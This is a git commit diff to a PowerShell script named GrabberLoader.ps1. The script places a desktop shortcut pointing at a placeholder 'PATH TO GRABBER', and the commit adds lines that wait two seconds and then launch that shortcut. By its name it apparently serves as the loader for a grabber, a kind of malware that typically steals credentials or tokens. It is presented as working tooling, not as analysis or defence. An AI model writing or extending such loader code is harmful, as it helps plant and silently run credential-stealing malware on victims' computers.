02cfd6a223bde08e981032939aafe1c287357abb
D00MTrooper <122827195+D00MTrooper@users.noreply.github.com>
2023-01-17 18:25:54 +0100

    Update GrabberLoader.ps1

--- GrabberLoader.ps1
+++ GrabberLoader.ps1
@@ -3,3 +3,5 @@ $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut("$env:USERPROFILE\Desktop\MyShortcut.lnk")
 $Shortcut.TargetPath = "PATH TO GRABBER"
 $Shortcut.Save()
+Start-Sleep -Seconds 2
+Start-Process "$env:USERPROFILE\Desktop\MyShortcut.lnk"
